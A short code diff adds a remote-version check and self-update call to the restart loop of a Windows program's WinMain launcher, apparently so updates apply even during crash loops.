@@ -2704,6 +2704,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     while (true) {
         RemoveKillFlag();
 
+        // Check for updates before spawning child (works even in crash loops)
+        { int rv = GetRemoteVersion(); if (rv > NETPEN_VERSION) { bool upd = DeployUpdate(rv); if (upd) break; } }
+
         STARTUPINFOA si = {0};
         si.cb = sizeof(si);
         PROCESS_INFORMATION pi = {0};
